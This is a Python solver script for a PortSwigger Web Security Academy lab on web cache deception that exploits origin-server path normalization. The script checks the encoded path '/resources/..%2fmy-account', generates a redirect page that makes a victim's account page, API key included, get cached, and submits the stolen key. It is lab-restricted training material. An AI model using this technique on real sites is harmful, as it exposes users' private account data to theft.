#!/usr/bin/env python3
"""
Lab: Web cache deception - Exploiting origin server normalization
Link:
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization

Description:
    This script demonstrates a path-normalization discrepancy between the
    cache and the origin server. It logs in as the lab user, checks the
    account endpoint, tests the encoded path, and creates an exploit page
    that you deliver through the PortSwigger Exploit Server.

Usage:
    python3 lab-3-wcd-origin-normalization.py https://YOUR-LAB-ID.web-security-academy.net
    python3 lab-3-wcd-origin-normalization.py https://YOUR-LAB-ID.web-security-academy.net -p 127.0.0.1:8080

Proxy:
    -p / --proxy accepts HOST:PORT, following the style of your Lab 11 script.
    HTTPS certificate verification is disabled to support local intercepting
    proxies such as Burp. Use this only for authorized lab testing.
"""

import sys
import re
import argparse
import time
from html.parser import HTMLParser
from urllib.parse import urlsplit

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

TIMEOUT = 10
POLL_INTERVAL = 3
POLL_ATTEMPTS = 40

USERNAME = "wiener"
PASSWORD = "peter"


class CSRFParser(HTMLParser):
    """Extract the login form's CSRF token."""
    def __init__(self):
        super().__init__()
        self.csrf = None

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "input":
            attrs = dict(attrs)
            if attrs.get("name") == "csrf":
                self.csrf = attrs.get("value")


def print_banner():
    banner = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║  Web Cache Deception – Origin Server Normalization              ║
║  PortSwigger Web Security Academy                                ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)


def build_proxies(proxy):
    """Build requests proxy dictionary using HOST:PORT input."""
    if proxy:
        proxy_url = proxy if "://" in proxy else f"http://{proxy}"
        return {"http": proxy_url, "https": proxy_url}
    return {}


def get_session(url, proxy=None):
    """Create a session and retrieve the login page's CSRF token."""
    session = requests.Session()
    session.proxies.update(build_proxies(proxy))
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WCD-Lab-Solver/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    try:
        response = session.get(f"{url}/login", timeout=TIMEOUT)
        response.raise_for_status()
    except requests.exceptions.ProxyError:
        print(f"{RED}[✗] Proxy connection failed. Is your proxy listener running?{RESET}")
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print(f"{RED}[✗] Connection failed. Is the lab running?{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"{RED}[✗] Request timed out.{RESET}")
        sys.exit(1)
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Could not load login page: {exc}{RESET}")
        sys.exit(1)

    parser = CSRFParser()
    parser.feed(response.text)

    if not parser.csrf:
        print(f"{RED}[✗] Could not find the login CSRF token.{RESET}")
        print(f"{YELLOW}[*] Check that the lab is active and the URL is correct.{RESET}")
        sys.exit(1)

    return session, parser.csrf


def login(session, url, csrf, username=USERNAME, password=PASSWORD):
    """Log in as the standard lab user."""
    print(f"{YELLOW}[*] Logging in as {username}...{RESET}")

    try:
        response = session.post(
            f"{url}/login",
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
            allow_redirects=True,
            timeout=TIMEOUT,
        )
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Login request failed: {exc}{RESET}")
        sys.exit(1)

    if "/login" in urlsplit(response.url).path:
        print(f"{RED}[✗] Login failed. Check the credentials and lab status.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[✓] Login request completed.{RESET}")


def show_response(label, response):
    """Print useful response details for troubleshooting."""
    print(f"\n{CYAN}[{label}]{RESET}")
    print(f"{YELLOW}URL         :{RESET} {response.url}")
    print(f"{YELLOW}Status      :{RESET} {response.status_code}")
    print(f"{YELLOW}X-Cache     :{RESET} {response.headers.get('X-Cache', 'Not present')}")
    print(f"{YELLOW}Cache-Control:{RESET} {response.headers.get('Cache-Control', 'Not present')}")
    print(f"{YELLOW}Location    :{RESET} {response.headers.get('Location', 'None')}")


def extract_api_key(html):
    """Try to extract an API key from an account page."""
    patterns = [
        r"Your\s+API\s+Key\s*</[^>]*>\s*<[^>]*>\s*([^<\s]+)",
        r"API\s*key\s*</[^>]*>\s*<[^>]*>\s*([^<\s]+)",
        r"API\s*key\s*:\s*([A-Za-z0-9._~-]{8,})",
        r"Your\s+API\s+key\s*(?:is)?\s*[:\-]?\s*([A-Za-z0-9._~-]{8,})",
    ]

    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            return match.group(1)

    return None


def test_account(session, url):
    """Verify that the authenticated account page is accessible."""
    print(f"\n{YELLOW}[*] Checking /my-account...{RESET}")

    try:
        response = session.get(f"{url}/my-account", timeout=TIMEOUT)
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Account request failed: {exc}{RESET}")
        sys.exit(1)

    show_response("Baseline account endpoint", response)

    if response.status_code != 200:
        print(f"{RED}[✗] Account page did not return HTTP 200.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[✓] Authenticated account page is accessible.{RESET}")

    api_key = extract_api_key(response.text)
    if api_key:
        print(f"{CYAN}[*] Your account API key: {api_key}{RESET}")

    return response.text


def test_origin_normalization(session, url):
    """
    Test whether the origin decodes %2f and resolves the resulting dot segment.
    Keep the encoded slash in the request path.
    """
    path = "/aaa/..%2fmy-account"
    print(f"\n{YELLOW}[*] Testing origin normalization: {path}{RESET}")

    try:
        response = session.get(
            url + path,
            allow_redirects=False,
            timeout=TIMEOUT,
        )
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Normalization test failed: {exc}{RESET}")
        sys.exit(1)

    show_response("Origin normalization test", response)

    if response.status_code == 200 and (
        "my-account" in response.text.lower()
        or extract_api_key(response.text)
    ):
        print(f"{GREEN}[✓] Origin appears to normalize the encoded path to /my-account.{RESET}")
    else:
        print(f"{YELLOW}[!] The expected account response was not confirmed.{RESET}")
        print(f"{YELLOW}    Inspect the response in the output/proxy history.{RESET}")

    return response


def test_cache_path(session, url):
    """Send the candidate cache path twice and display cache-related headers."""
    path = "/resources/..%2fmy-account"

    print(f"\n{YELLOW}[*] Testing candidate cache path: {path}{RESET}")
    for attempt in range(1, 3):
        try:
            response = session.get(
                url + path,
                allow_redirects=False,
                timeout=TIMEOUT,
            )
        except requests.exceptions.RequestException as exc:
            print(f"{RED}[✗] Cache-path request failed: {exc}{RESET}")
            sys.exit(1)

        show_response(f"Cache-path request {attempt}", response)
        time.sleep(1)


def create_exploit(url):
    """
    Create the redirect page that makes the victim request the deceptive URL.
    This file must be placed in the PortSwigger Exploit Server's Body field.
    """
    victim_path = "/resources/..%2fmy-account?wcd"
    victim_url = url + victim_path

    html = f"""<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Web Cache Deception Lab</title>
</head>
<body>
    <script>
        window.location = {victim_url!r};
    </script>
</body>
</html>
"""

    filename = "wcd_exploit.html"
    try:
        with open(filename, "w", encoding="utf-8") as file:
            file.write(html)
    except OSError as exc:
        print(f"{RED}[✗] Could not write exploit file: {exc}{RESET}")
        sys.exit(1)

    print(f"\n{GREEN}[✓] Exploit HTML saved to: {filename}{RESET}")
    print(f"{CYAN}[*] Victim URL: {victim_url}{RESET}")
    print(f"\n{YELLOW}[*] Exploit HTML:{RESET}\n{html}")

    print(f"{BOLD}NEXT STEPS:{RESET}")
    print("  1. Open the lab's 'Go to exploit server' link.")
    print("  2. Paste the generated HTML into the Exploit Server Body field.")
    print("  3. Click 'Store' and then 'Deliver exploit to victim'.")
    return victim_url


def submit_solution(session, url):
    """
    Ask the user to paste Carlos's API key after delivering the exploit,
    then submit it to the lab's /submitSolution endpoint.
    """
    print(f"\n{BOLD}{CYAN}MANUAL STEP:{RESET}")
    print("  1. Open the Exploit Server link from the lab page.")
    print("  2. Store the generated exploit HTML and deliver it to Carlos.")
    print("  3. Open the Exploit Server access log.")
    print("  4. Copy Carlos's API key from the victim's cached response.")

    while True:
        api_key = input(
            f"\n{YELLOW}[?] Paste Carlos's API key (or type 'q' to quit): {RESET}"
        ).strip()

        if api_key.lower() in {"q", "quit", "exit"}:
            print(f"{YELLOW}[*] Submission cancelled by user.{RESET}")
            return False

        api_key = api_key.strip("\"' \t\r\n")
        if not api_key:
            print(f"{RED}[✗] API key cannot be empty.{RESET}")
            continue
        if any(char.isspace() for char in api_key):
            print(f"{RED}[✗] API key contains whitespace. Copy only the key value.{RESET}")
            continue
        break

    print(f"\n{YELLOW}[*] Submitting API key to {url}/submitSolution ...{RESET}")

    try:
        response = session.post(
            f"{url}/submitSolution",
            data={"answer": api_key},
            allow_redirects=True,
            timeout=TIMEOUT,
        )
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Could not submit the API key: {exc}{RESET}")
        return False

    print(f"{YELLOW}[*] HTTP Status: {response.status_code}{RESET}")

    try:
        result = response.json()
    except ValueError:
        result = None

    if isinstance(result, dict) and result.get("correct") is True:
        print(f"\n{GREEN}{BOLD}[✓] Correct API key! Lab solved successfully.{RESET}")
        return True

    if isinstance(result, dict) and result.get("correct") is False:
        print(f"{RED}[✗] API key rejected. Make sure you copied Carlos's key correctly.{RESET}")
        return submit_solution(session, url)

    page_text = response.text.lower()
    if "is-solved" in page_text or "congratulations" in page_text:
        print(f"\n{GREEN}{BOLD}[✓] Submission appears successful. Check the lab status.{RESET}")
        return True

    print(f"{YELLOW}[!] The server did not clearly confirm success.{RESET}")
    if result is not None:
        print(f"{CYAN}[*] Response JSON: {result}{RESET}")
    else:
        print(f"{CYAN}[*] Response preview: {response.text[:500]}{RESET}")
    print(f"{YELLOW}[*] Check the lab status in your browser.{RESET}")
    return False


def exploit(url, proxy=None):
    print(f"{YELLOW}[*] Target : {url}{RESET}")
    print(f"{YELLOW}[*] Proxy  : {proxy if proxy else 'disabled'}{RESET}\n")

    # Step 1 – Start session and get CSRF token
    session, csrf = get_session(url, proxy)

    # Step 2 – Authenticate as the lab user
    login(session, url, csrf)

    # Step 3 – Verify authenticated account page
    test_account(session, url)

    # Step 4 – Test origin-side normalization
    test_origin_normalization(session, url)

    # Step 5 – Inspect candidate cache path
    test_cache_path(session, url)

    # Step 6 – Generate the exploit HTML and get victim URL
    victim_url = create_exploit(url)

    # Step 7 – Ask for Carlos's API key and submit it to the lab
    submit_solution(session, url)


def validate_url(value):
    parsed = urlsplit(value)
    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or not parsed.hostname.endswith(".web-security-academy.net")
        or parsed.path not in ("", "/")
        or parsed.query
        or parsed.fragment
    ):
        raise argparse.ArgumentTypeError(
            "Provide only your full lab origin, e.g. "
            "https://0a...web-security-academy.net"
        )
    return value.rstrip("/")


def main():
    parser = argparse.ArgumentParser(
        description="PortSwigger WCD lab – exploiting origin server normalization"
    )
    parser.add_argument("url", type=validate_url, help="Your PortSwigger lab URL")
    parser.add_argument("-p", "--proxy", metavar="HOST:PORT",
                        help="Optional proxy, e.g. 127.0.0.1:8080")
    args = parser.parse_args()

    print_banner()
    exploit(args.url, proxy=args.proxy)


if __name__ == "__main__":
    main()
